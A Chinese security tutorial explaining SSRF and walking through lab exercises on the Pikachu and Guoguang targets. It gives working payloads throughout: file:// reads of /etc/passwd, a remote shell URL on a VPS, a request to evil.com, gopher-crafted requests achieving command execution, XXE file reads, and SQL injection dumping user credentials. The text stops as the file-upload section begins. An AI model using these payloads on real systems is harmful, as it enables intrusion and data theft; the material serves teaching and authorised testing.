#  SSRF漏洞详细讲解：攻击者是怎么“骗”服务器发起请求的   
AegisGuard  AegisGuard   2025-05-29 05:58  
  
免责声明  
  
合法使用原则：文中提及的技术、工具或案例，仅用于授权范围内的安全测试、防御研究或合规技术分享，未经授权的网络攻击、数据窃取等行为均属违法，需承担法律责任。  
  
风险自担与责任豁免：文章内容基于公开信息整理，不保证技术的准确性、完整性或适用性。读者需自行评估技术应用风险，若因不当使用导致任何法律后果或损失，均由使用者自行承担，与本公众号及作者无关。  
  
法律管辖与提示：本公众号坚决拥护相关法律法规，反对任何危害网络安全的行为，读者需严格遵守法律法规。  
# 一、SSRF漏洞介绍  
- SSRF（Server-Side Request Forgery，服务器端请求伪造）漏洞是一种由攻击者构造请求，由服务端发起请求的安全漏洞。  
  
- 攻击者可以利用该漏洞使服务器端向攻击者构造的任意域发出请求，一般情况下，SSRF攻击的目标是外网无法访问的内部系统（正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔离的内部系统）。  
  
- 简单来说就是利用服务器的漏洞，以服务器的身份发送一条构造好的请求给服务器所在内网进行攻击。  
  
- 漏洞产生的原因：通常是因为服务端提供了从其他服务器应用获取数据的功能，但没有对目标地址做足够的过滤和限制  
，导致攻击者可以通过篡改请求的目标地址来伪造请求，从而实现对内网资源的未授权访问。  
  
- 从指定URL获取网页文本内容；  
  
- 加载指定网址的图片；  
  
- 前提：该站点具备一个对外获取的资源的能力，或者说能够从执行目标获取资源的能力  
  
- 攻击目标：一般是从外网无法访问的内部系统（外网打内网）。  
  
# 二、SSRF漏洞原理  
- SSRF漏洞的形成大多是由于服务端提供了从其他服务器应用获取数据的功能（通过指定的URL，网站可以从其他地方获取图片、下载文件、读取文件内容等），而且没有对目标地址做过滤与限制，使得攻击者可以利用存在缺陷的web应⽤作为代理，攻击其远程和本地的服务器。  
  
- 例如，攻击者操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片等，利用的是服务端的请求伪造。  
  
- 简单概括就是SSRF利用存在缺陷的Web应用作为代理攻击远程和本地的服务器。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01ojAtmvddOF9PRMwPIADYxAtbWaiaIwmSvcYco0EfPFaVQgh5KHsF7eZw/640?wx_fmt=png&from=appmsg "")  
# 三、SSRF危害  
- 敏感文件查询：可以通过SSRF漏洞获取网站/服务器本身的文件（/etc/passwd  
）  
  
- 端口扫描：可以利用SSRF漏洞对外网、服务器所在的内网、本地进行端口扫描，获取一些服务的banner信息。  
  
- banner信息就是指服务器返回给你的响应头的相关信息（例如：返回过来的状态码，服务版本号等等），通过这些banner信息可以得到一个服务器的端口号、上面安装了哪些服务，以及服务相应的版本等等，从而可以找到相应的漏洞。  
  
- 攻击内网应用：攻击者可以利用SSRF漏洞攻击运行在内网或本地的应用程序，因为请求是由服务端发起的，所以服务端可以请求到与其相连但与外网隔离的内部系统。  
  
- 指纹识别：攻击者可以利用SSRF漏洞对内网进行指纹识别，识别企业内部的资产信息。  
  
- 攻击Web应用：攻击者可以利用SSRF漏洞攻击内外网的Web应用（比如 struts2、sql注入、redis……）。  
  
- DOS攻击：请求大文件，始终保持连接keep-alive always  
  
# 四、伪协议&&作用  
## file://  
- 作用：从文件系统中读取文件内容  
  
- 读取敏感文件  
  
```
file:///etc/passwd
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oE0nbHfFLibIa2EaFbutcDkQnd8VQrYAP5ibhJhA4tVEZH5ibszFSMQ5tw/640?wx_fmt=png&from=appmsg "")  
- 显示当前网段路由信息  
  
```
file:///proc/net/fib_trie
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01otcwSHcCzCktFzEjfZfOkscibkoEpy8Sarh7ZnibwVZsM9YUzyPiaESzSg/640?wx_fmt=png&from=appmsg "")  
## http://  
- 作用：请求/获取/加载资源信息  
  
- 允许通过HTTP访问文件或者一些资源（可以结合Burp的Intruder模块进行目录扫描）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oxPozvbeb0TUdnouY8b3mLIbia6jkyWakMTgOk9mgZ7kNb6jYNKIVpMQ/640?wx_fmt=png&from=appmsg "")  
- 还可以加载远程恶意文件  
  
```
http://vps ip/shell.php
```  
## dict://  
- 作用：字典服务协议，访问字典资源  
  
- 探测3306端口是否开放  
  
```
dict:///ip:3306
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01ovibQU9lQYrG8FxHDd1RjRttqMftcaAiavZDsvrJG28gyUnee47teuaVA/640?wx_fmt=png&from=appmsg "")  
## gopher://  
- 作用：可以进行GET/POST提交，还可以利用Redis、Fastcgi、Mysql等服务  
  
- 基本格式  
  
```
gopher://ip:port/需要提交的内容
```  
- 默认访问70端口，所以访问时要根据情况改端口号  
  
- 监听70端口，使用gopher://  
伪协议提交数据时不加端口号，发现收到数据  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oGqMRktoibgNSylOBZuG3QibDGpicx5tlXD57gxPZmY1Tw0FRX2KVRcO1g/640?wx_fmt=png&from=appmsg "")  
- 默认不转发第一个字符，所以使用时可以使用下划线进行占位（gopher://_ip:port/xxxx  
）  
  
```
nc -lvp 8080
```  
```
curl gopher://127.0.0.1:8080/abcd
```  
- 可以看到提交了4个字符，发现只接收到了后面3个  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01ormcaqeqEEtIBWrW6ekyYGBO08CK4qYj9icCEaztpibvMy0t74rmicXHRQ/640?wx_fmt=png&from=appmsg "")  
## 其它  
- ftp  
：文件传输协议  
  
```
ssrf.php?url=ftp://evil.com:12345/TEST
```  
- sftp://  
：安全文件传输  
  
```
ssrf.php?url=sftp://example.com:11111/
```  
- tftp://  
：简单文件传输协议  
  
```
ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET
```  
- ldap://  
：轻量级目录访问  
  
```
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
```  
# 五、pikachu靶场代码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01o11Y0JX4TCeY0sDGFOdPPoo9GJialfXvOnypia2MewMJTQngsguo74Ttg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oFnGuiasoJxYJAM5E89790IeFEDaLADZwGWh9LMz6GXtkPkgAliamZ8Eg/640?wx_fmt=png&from=appmsg "")  
# 六、国光SSRF靶场  
## file://&&http://伪协议收集内网信息  
- 查看当前网卡IP，判断当前主机所处的内网网段  
  
- 此时看到内网存在172网段  
  
```
file:///etc/hosts
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oTwiaDFT98oyCnC8JlOmiad5kTuRZAmmshoGpoJKXJOJicibPibtNN3OYkbA/640?wx_fmt=png&from=appmsg "")  
- 查看arp缓存表，寻找内网存活的主机  
  
- 使用arp扫内网的好处就是，不需要关心对方是否开了防火墙、是否写了安全策略，只要对方是基于ip协议的机器，通过arp都能探测到  
  
```
file:///proc/net/arp
```  
- 此时只能看到存在一个ip地址，是因为只有与别的机器通信，才会生成相应的arp表  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01ogFjUIk2nRTiaumjSYPRsFfRXz431icOT0TE8pIIiaibvuAdBkVysSicIeWA/640?wx_fmt=png&from=appmsg "")  
- 猜测内网不会只存在一台机器，如果想要确定内网有哪些主机存活，就需要通过存在SSRF漏洞的机器对内网ip段的所有主机主动发起访问  
  
- 通过http伪协议与目标内网的任意ip进行数据通信前，会先发起一个arp请求，如果存活，对方就会回复一个单播的应答  
  
```
http://172.250.250.6 
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oNxHPKc0lSOqFETG3rtNSb5Lq2tUTiaGzkJReeSetMNl5kha0yYayMIw/640?wx_fmt=png&from=appmsg "")  
- 此时再次查看arp表，发现多了一个ip（172.250.250.6）且显示了mac地址，说明该主机存活  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01ogGibdZelWkjTvgfaXFdLibJD5NopH5ztcW7ma9f5v1iarHNnztQ8opDkg/640?wx_fmt=png&from=appmsg "")  
- 但是一个个手动访问效率非常低，所以可以通过Burp的Intruder模块，批量访问目标内网，然后再查看arp表  
  
- 访问一个IP地址，然后通过Burp抓包，发送到Intruder  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oL0MfJ6uicEA6FPqVic2AFhdT4jLvCeW1Snr3f3iadVU5yUlnZ16tn9dzw/640?wx_fmt=png&from=appmsg "")  
- 将需要批量访问的主机位设置为变量  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oc3jYGow3EshNDQEaSJjjJcgO3icGOSE5C5lk2xlzlS2UnT1sA9Dbapg/640?wx_fmt=png&from=appmsg "")  
- 选择Payload类型为数字，范围是1-254，步长为1  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01ol2U0sJKqibFx472K6aV0qVLeaQmxNZtzlA21Lqe3daOm1dlcDqzx0YQ/640?wx_fmt=png&from=appmsg "")  
- 点击开始爆破  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oe2okSAukWJ6WHhR1uAJvGKrOqxE8rftmpJquBic3SUcjeoMrWjbYYcg/640?wx_fmt=png&from=appmsg "")  
- 再次查看arp表，发现内网存活的其它主机  
  
- 注意：mac地址为0的说明不存活  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01o8ic9tO3ibsFTx4rLevjaH79j1EV2a4uUjZqXb89cHUczp804pic6qic2NQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oic2M8zVNraVdrIMpVW8zJW5ZWJU4YzQhP8sF1S5h3OjUXbwnUPZiboJw/640?wx_fmt=png&from=appmsg "")  
## dict://伪协议扫描内网机器开放的端口  
- ftp://  
和http://  
等等伪协议都可以进行端口探测，但是使用dict://  
伪协议速度会更快  
  
- 使用Burp来进行快速测试  
  
- 先通过dict://  
伪协议访问任意ip的任意一个端口，通过Burp抓包，发送到Intruder  
  
```
dict://172.250.250.6:80
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01ofJNgFtTrrQUN93ryEwxK5VKNJ6Fmsw8QIa2KdALKlbCIhryOjYnwlw/640?wx_fmt=png&from=appmsg "")  
- 将ip的主机位和端口设置为变量，攻击类型设置为Cluster bomb  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oVBrenXjI4tP5h7CBxmBzSJsxGLj0hr52d5tlSNepY3x8LwDVibf8nTg/640?wx_fmt=png&from=appmsg "")  
- Payload1的类型设置为数字，范围是1-254，步长为1  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01ouATzJq7dZknAWQYVIALPUngWfTKThgtrQTdT9iabY7loukhqicjpgDUA/640?wx_fmt=png&from=appmsg "")  
- Payload2的类型设置为Simple list，然后将常见的端口号复制进去  
  
```
80
443
3306
6379
8080...
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oY7JUOUxxX2f68rQKPjehDkNO0mwibtRaGeiblExufnOBf9E3lmM1EaibA/640?wx_fmt=png&from=appmsg "")  
- 点击开始爆破  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oaNWkbuXa1iaBwavicsq34S0icDt8TcJvmIFFjEcML3ZKHVWjGT5QNTFkw/640?wx_fmt=png&from=appmsg "")  
- 爆破完以后就可以通过Length来进行判断，哪些主机的哪些端口是开放的  
  
- 例如：此处172.250.250.8的3306端口已经开启  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01odyq7qDibsArTibuFzdmcXcEpwgDgXopKlN46rrunXXmaSnaGic3I61HWA/640?wx_fmt=png&from=appmsg "")  
## 通过http://伪协议进行文件&&目录扫描  
- 此时访问172.250.250.4，发现只是一个默认页  
  
```
http://172.250.250.4
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oFicZbtbQgzy0f7hJsInpSp0icDu3uJtFKzSKpXaO6voxQ8N6OQic9jEdw/640?wx_fmt=png&from=appmsg "")  
- 此时想要知道这个路径下是否存在其它文件，可以在后面拼接一个文件名，然后使用Burp抓包，发送到Intruder  
  
```
http://172.250.250.4/index.php
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01obaDGuGYZxrppBSib3r2xBsg05p2VXffR8gRHjKw6Ribt91XD2054ChibQ/640?wx_fmt=png&from=appmsg "")  
- 此时将文件名设置为变量  
  
- 可以文件名+后缀设置为变量，也可以分别将文件名和后缀设置为变量（后面单独用两个字典跑即可）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oPnl3nT16wWtJ5MJY1SxnDO3yJNQX7wfJXPf8xr8dViaHjebchmqfbOg/640?wx_fmt=png&from=appmsg "")  
- 在Payload中粘贴进自己的字典  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01o3fuAVKVl1C3KY3KKYyfZoAdDTjbz1ndpIYW0slYAvjYm1WIliaJDMCw/640?wx_fmt=png&from=appmsg "")  
- 爆破完成后，即可根据结果判断存在哪些文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oHicJ2bvc5GlU0OlhazpgVlTHnSALgBQxdYf6T8g74LQibeiaBwibp5GEpA/640?wx_fmt=png&from=appmsg "")  
## gopher://伪协议的Payload构造  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01o2rFga5yr5PymELiapPB5TKr9s4u85R6AMOEp0npOcbq08Epf022cQxA/640?wx_fmt=png&from=appmsg "")  
- 场景：通过GET和POST方法提交name的值，从而打印在屏幕上  
  
- Payload可以参考httpGET和POST的头部  
  
### GET方法  
- 方法：  
  
- 模仿http头部的请求路径信息  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01ohf3XDib3gFGJWJVz2Siaglr3X7hK1lkJ6vtLV75Q46y7PVI2kKs0icAeA/640?wx_fmt=png&from=appmsg "")  
- 模仿http头部的请求的ip地址  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oRPlEY3p3xLicWsaw0uYoKjjrHvibppicn6BNZPf3xjuZ53PVcVIicic6xibQ/640?wx_fmt=png&from=appmsg "")  
- 注意换行符  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01o0F4upmysFVXRrnK8TRKwl3DzrkvYiaibCqRtSlx2N1VhibArKRJVhUIrg/640?wx_fmt=png&from=appmsg "")  
- 整合得到  
  
```
GET /name.php?name=shit HTTP/1.1
Host: 172.250.250.4
```  
- 拼接构造最终Payload  
  
- 注意空格、换行、问号这些都经过了URL编码  
  
```
gopher://172.250.250.4:80/_GET%20/name.php%3fname=lazy%20HTTP/1.1%0d%0AHost:%20172.250.250.4%0d%0A
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oMFzM0V0Y8CH64490OmspLCczYx4KDiafvYW7GSmyfKmxiaibH7qGQLSAw/640?wx_fmt=png&from=appmsg "")  
- 除了直接在输入框提交，也可以先用Burp抓包，在Burp发送数据  
  
- 先抓包，发送到Repeater  
  
```
gopher://172.250.250.4:80/_
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oDpILmytbEU4erPU8qTiaNoDEaNM3XD2wTpkYpicfvh1b9QMDMSS02AwA/640?wx_fmt=png&from=appmsg "")  
- 在Repeater中拼接Payload  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oyMcApEQ3OMibXhDzpCUuUD2YJiaAGXb6fQgDHP48Xx1gPZ4DB5bC4uKw/640?wx_fmt=png&from=appmsg "")  
- 将Payload进行两次URL编码  
  
- 一次  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01ohFhT14RAnoickiaYjRhzlaH5JaqbicFH0vWMcmZRd3TeA0lJ8WnlfMqGw/640?wx_fmt=png&from=appmsg "")  
- 两次  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01ocicdt7xZqtbImMZeSlmoQOMibgVadC4iciaTSCIpSfYoUFzbyiclAguwfVg/640?wx_fmt=png&from=appmsg "")  
- 点击发送，发现提交成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oUl4KIRQ9THwe5VRVAVHiaf7DmXFaVvliaHdbibN2cYRGq16cdjIupEvdA/640?wx_fmt=png&from=appmsg "")  
- 此时提交的Payload要经过两次URL编码：原因是存在SSRF的机器会对提交的Payload进行一次解码，接着这台SSRF机器将Payload再次发送到内网的其它机器，这个Payload会再次被URL解码；所以提交的时候需要编码两次，对方才能解码两次，得到原始数据  
  
### POST方法  
- 方法：  
  
- 模仿http头部的请求路径信息  
  
- 模仿http头部的ip信息  
  
- 模仿http头部的Content-Type字段（根据实际提交的数据类型选择）  
  
- 模仿http头部的Content-Length字段（根据实际提交数据的长度选择）  
  
- 同样注意换行  
  
- 整合得到  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oIdJMnhibgyFQB5Jy3SF2ArMwoeeibNuksYoQUbTicpGXibrT6zRJxyrY9w/640?wx_fmt=png&from=appmsg "")  
- 拼接需要提交的信息得到Payload  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oNcIiaiahxU8j1W6zBHIYu4DQf8ia7jdX9oPcywHlfD7Q17O8R5pXD9UiaQ/640?wx_fmt=png&from=appmsg "")  
- 同样使用前面的方法，在Burp中将Payload进行两次URL编码进行，点击发送后发现提交成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oJzJPliayxNIeBlgHuYZU9Yuk5eqhCX9vubgj94SaYyJIkx2AUGxaziaA/640?wx_fmt=png&from=appmsg "")  
## RCE1  
- 通过前面信息收集，发现内网172.250.250.4  
主机存在一个页面，可以拼接参数  
  
```
http://172.250.250.4/shell
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oXxwvnCuCSgkVwq0R4UVKNRVQe9XsfnvZypj0DOiaSeYTWSNgnroPmQw/640?wx_fmt=png&from=appmsg "")  
- 可以直接在http://  
伪协议后面拼接参数执行命令  
  
```
http://172.250.250.4/shell.php?cmd=ls
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01opVF9TRKBmF4XXJF2Bpr0txYUzTWMJhAt1FKvSS0KddNEfOaGG7WRicg/640?wx_fmt=png&from=appmsg "")  
- gopher://  
伪协议发包  
  
- 构造gopher://  
伪协议GET请求的Payload  
  
```
GET /shell.php?cmd=whoami HTTP/1.1
Host: 172.250.250.4
```  
- 然后抓包，发送到Repeater  
  
```
gopher://172.250.250.4:80/_
```  
- 拼接Payload，并且进行两次URL编码，发送后，发现执行成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oDxpTWTY3483ZMByTGNz9AicCzTaXiaH4touQtB7k8yAUdmDJgTR3wia3Q/640?wx_fmt=png&from=appmsg "")  
## RCE2  
- 通过信息收集，发现内网主机172.250.250.5  
存在一个网络测试页面  
  
```
http://172.250.250.5
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oP2UQO6UjEVNgalqr0eN2BlghNWnhMGGVib0mfBweTR9Sd2atrwdjVSA/640?wx_fmt=png&from=appmsg "")  
- 右键查看源代码，发现当前拼接执行的参数是ip  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oCgwTU3P6RKU5BWUpeHtngLjWMFwBicwrDibVn9FVZV9Z1smPg6H4VhlQ/640?wx_fmt=png&from=appmsg "")  
- 先构造gopher://  
伪协议POST请求的Payload  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01o7WZHKqjy5TfHHVdUNXNB5v8f5JibkGRY5sZroWev2tiawHGDxqVX8kWw/640?wx_fmt=png&from=appmsg "")  
- 然后抓包，发送到Repeater  
  
```
gopher://172.250.250.5:80/_
```  
- 拼接Payload，并且进行两次URL编码，发送后，发现执行成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01ocqJ7RuGE05KicUGzGMriaicph0smjSYYOsMgoBmkb3BsvddqusDc7mdhw/640?wx_fmt=png&from=appmsg "")  
## XXE漏洞利用  
- 通过内网信息收集，发现内网存在一个用户登录页  
  
```
http://172.250.250.6
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oINyg334VrqKvWDpMZp11vHPJibt4fY6QcFibYrypT4xcppnjmdjbwJiag/640?wx_fmt=png&from=appmsg "")  
- 右键查看源代码，发现通过XML格式的传递数据，通过POST提交的方式将输入的用户名密码提交到doLogin.php  
这个页面  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oiaJhvDguCahaF4LAZTghJCOI7CrKrn3ia34V4L1YnNYElACrPPmMpZZQ/640?wx_fmt=png&from=appmsg "")  
- 先构造gopher://  
伪协议POST请求的Payload（正常请求，提交用户名密码）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oyJiaKzhtRKico5lvuMwr7aSyKv3wpO5NnObIejRHJztfEfEiaqYTEyMhA/640?wx_fmt=png&from=appmsg "")  
- 然后抓包，发送到Repeater  
  
```
gopher://172.250.250.6:80/_
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oSSJwkqIRRM9sZQibPs4KiawxhYMtjNWdXf5fCS0aGiboKiawNriaJ6bpHzw/640?wx_fmt=png&from=appmsg "")  
- 拼接Payload，并且进行两次URL编码，发送后，发现提交成功  
  
- 在源代码可以看出，响应code为1，说明登录成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oqDUhYMWvpDN9N9CDdmOrK30iaRicZgxs4azM472HLk7o6oJIvO07UTjw/640?wx_fmt=png&from=appmsg "")  
- 此时构造一个恶意的Payload（文件读取）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01om3MQriah36OyGhwuWegODmafWjToXibY3RCs3w6vtNMwGmIlUHBOHvEA/640?wx_fmt=png&from=appmsg "")  
- 再次在Burp拼接Payload，并且进行两次URL编码，发送后，发现文件读取成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oogDVxdW2KybMtoicIenDJ4ZUGzeQDQAOdibTFYVGglK7mhAgthWgoibRA/640?wx_fmt=png&from=appmsg "")  
- 补充  
  
- DOCTYPE声明：在XML文档中，<!DOCTYPE>声明定义了文档类型和文档可以使用的合法元素和属性。这里定义了一个名为root的自定义文档类型。  
  
- ENTITY声明：在DOCTYPE声明内部，定义了一个名为lazy的实体。这个实体使用SYSTEM标识符指定了一个URI（统一资源标识符），在这个例子中是file:///etc/passwd。这意味着该实体将尝试从服务器的本地文件系统加载/etc/passwd文件的内容。  
  
- 实体引用：在XML文档的<username>标签内，使用了&lazy;，这是一个对之前定义的lazy实体的引用。当XML解析器遇到这个实体引用时，它会用lazy实体所指向的内容替换掉这个引用。  
  
## SQL注入漏洞  
- 靶场中存在一个sqllab模块  
  
```
http://172.250.250.11
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oBvWAdASpf6XgybSCHrSdKqraict2iaSAibEVYObEzgRmbKcmickFGHgzUg/640?wx_fmt=png&from=appmsg "")  
- 通过加上单引号判断是否存在注入  
  
- 发现数据库报错信息，说明存在sql注入  
  
```
http://172.250.250.11/Less-1/?id=1'
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oX97FAxBiawJXUEG94Q5HjuianT4wPkWYcgulfEWu1X1wFwZ6KxL3VTgQ/640?wx_fmt=png&from=appmsg "")  
- order by  
判断查询列数  
  
- 发现列数为3列  
  
```
http://172.250.250.11/Less-1/?id=*1'%20order%20by%203--%20
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oCW0kuxuJyDjd3Tf3XQllkv4aQrmP2FYW3xqhhYErDfQ1DWfZJJWnicA/640?wx_fmt=png&from=appmsg "")  
```
http://172.250.250.11/Less-1/?id=*1'%20order%20by%20--%20
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oBhv6ml2l0un4uApsRChD8cMbtibu2iccoT77UQKF8vxaWuGtvZTk2Xqg/640?wx_fmt=png&from=appmsg "")  
- 查询回显位  
  
- 发现回显位是2和3  
  
```
http://172.250.250.11/Less-1/?id=*1'%20union%20select%201,2,3--%20
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oAoXrvLH4PYEdeePe1xJlLnLVxo2Uic8q2UBzD1dl9gHqvC5U5m6YxEw/640?wx_fmt=png&from=appmsg "")  
- 查询数据库名  
  
```
http://172.250.250.11/Less-1/?id=*1'%20union%20select%201,database(),3--%20
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01od9hGOWDWmywpYCuuf2UUTUHLJUTn9ns1iakRzwPGGV6bQnaCNtA77bw/640?wx_fmt=png&from=appmsg "")  
- 查询表名  
  
```
http://172.250.250.11/Less-1/?id=*1'%20union%20select%201,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%20'security'),3--%20
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oovVOU0O0MmBJo9bZIlDPa38VV9rIBe2cVhVb7TUiaORXwd71EhEPXlw/640?wx_fmt=png&from=appmsg "")  
- 查询user  
表的字段名（列名）  
  
```
http://172.250.250.11/Less-1/?id=*1'%20union%20select%201,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=%20'security'%20and%20table_name='users'),3--%20
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01onO8p4BOUdhgfVsiaibB9tJL7YwxxxqzyvDdU0RWCiax11TC20nU0mLQGA/640?wx_fmt=png&from=appmsg "")  
- 查询字段的值（数据）  
  
```
http://172.250.250.11/Less-1/?id=*1'%20union%20select%201,group_concat(concat_ws(0x3a,username,password)),3%20from%20security.users--%20
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oA0apMqY5j5K2rhEnzG8UxWDUZJaW0V3QocTueecDyfbdvY5D5zB1ng/640?wx_fmt=png&from=appmsg "")  
- 注意：如果是POST方法提交就需要查看源代码，找到提交的参数，然后构造Payload，通过gopher://  
伪协议来提交  
  
## 文件上传漏洞  
- 靶场中存在一个upload-labs模块  
  
```
http://172.250.250.14/Pass-01/index.php
```  
  
